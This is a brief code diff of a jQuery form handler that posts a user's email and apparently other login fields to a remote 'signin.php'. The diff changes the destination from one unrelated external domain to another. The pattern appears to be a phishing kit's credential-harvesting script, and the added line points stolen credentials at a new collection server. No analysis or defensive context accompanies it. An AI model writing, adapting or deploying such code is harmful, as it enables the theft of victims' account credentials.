@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://piromet-tr.com/standrop/signin.php",
+            url: "https://arenco.cam/newrayphp1/signin.php",
             method: "post",
             data: {
                 X1: email,
@@ -66,5 +66,6 @@ $(document).ready(function(){
             }
         })
     })
+
 
 });
